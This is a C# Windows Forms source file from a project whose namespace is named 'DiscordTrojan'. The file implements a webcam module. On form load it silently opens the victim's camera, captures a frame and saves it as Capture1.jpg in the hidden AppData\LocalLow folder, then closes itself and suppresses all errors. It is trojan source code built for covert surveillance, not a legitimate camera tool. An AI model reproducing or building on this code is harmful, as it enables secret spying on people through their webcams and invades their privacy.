using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Threading;


namespace DiscordTrojan
{
    public partial class WebCam : Form
    {
        public WebCam()
        {
            InitializeComponent();
        }

        string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string root = @"\AppData\LocalLow";
        VideoCaptureDevice videoCapture;
        FilterInfoCollection filterInfo;

        private void WebCam_Load(object sender, EventArgs e)
        {
            StartCamera();
        }
        void StartCamera()
        {
            try
            {
                filterInfo = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                videoCapture = new VideoCaptureDevice(filterInfo[0].MonikerString);
                videoCapture.NewFrame += new NewFrameEventHandler(CameraScreenshot);
                videoCapture.Start();
                Thread.Sleep(1000);
                videoCapture.Stop();
                SaveScreenshot();
                this.Close();
            }
            catch
            {
            }
        }

        private void CameraScreenshot(object sender, NewFrameEventArgs eventArgs)
        {
            pictureBox2.Image = (Bitmap)eventArgs.Frame.Clone();
        }

        void SaveScreenshot()
        {
            try
            {

                var bitmap = new Bitmap(pictureBox2.Width, pictureBox2.Height);
                pictureBox2.DrawToBitmap(bitmap, pictureBox2.ClientRectangle);
                System.Drawing.Imaging.ImageFormat imageFormat = null;
                imageFormat = System.Drawing.Imaging.ImageFormat.Jpeg;
                bitmap.Save(userPath + root + "\\Capture1.jpg", imageFormat);

            }
            catch
            {

            }
        }


        private void Camera_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                videoCapture.Stop();
            }
            catch
            {

            }
        }
        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
    }
}
